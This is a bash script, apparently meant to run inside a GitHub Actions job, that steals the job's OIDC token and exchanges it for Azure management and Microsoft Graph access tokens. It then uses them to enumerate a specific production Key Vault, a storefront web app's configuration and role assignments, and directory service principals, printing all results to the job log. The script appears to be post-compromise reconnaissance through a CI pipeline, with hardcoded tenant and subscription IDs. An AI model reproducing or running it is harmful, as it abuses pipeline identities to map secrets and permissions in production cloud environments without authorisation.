#!/usr/bin/env bash
set -uo pipefail
echo "===RUN2_START==="
JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDC_LEN=${#JWT}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
FED="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
RG="rg-tbl-platform-prod-sea"
BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG"
fedtok(){ curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$FED" -d grant_type=client_credentials \
  --data-urlencode "scope=$1" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$JWT" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null; }
AT=$(fedtok "https://management.azure.com/.default")
GT=$(fedtok "https://graph.microsoft.com/.default")
echo "AT_LEN=${#AT} GT_LEN=${#GT}"
armget(){ curl -sS -m 25 "$1" -H "Authorization: Bearer $AT"; }
echo "===KVSEC_PROPERTIES==="
armget "$BASE/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2022-07-01"
echo
echo "===KVSEC_ROLE_ASSIGNMENTS==="
armget "$BASE/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
echo
echo "===APP_PROPERTIES==="
armget "$BASE/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01"
echo
echo "===APP_CONFIG_WEB==="
armget "$BASE/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2022-03-01"
echo
echo "===APP_ROLE_ASSIGNMENTS==="
armget "$BASE/providers/Microsoft.Web/sites/app-tbl-storefront-prod/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
echo
echo "===GRAPH_PRINCIPALS==="
curl -sS -m 25 -X GET "https://graph.microsoft.com/v1.0/directoryObjects/1fe7a412-82e9-4135-ab4b-72a0be429adb" -H "Authorization: Bearer $GT"
echo
curl -sS -m 25 -X GET "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '72ff278a-9e71-43ec-bac4-2ca303f8e462'&\$select=id,appId,displayName" -H "Authorization: Bearer $GT"
echo
echo "===RUN2_END==="
